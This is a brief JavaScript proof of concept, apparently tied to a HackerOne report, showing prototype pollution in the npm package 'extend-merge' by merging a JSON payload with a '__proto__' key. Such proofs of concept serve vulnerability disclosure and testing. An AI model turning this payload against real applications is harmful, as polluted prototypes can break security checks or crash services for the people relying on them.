//https://hackerone.com/reports/878339
 
  const extend_merge = require("extend-merge");
  const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  let obj = {};

   

  extend_merge.merge({}, payload);
// End of file
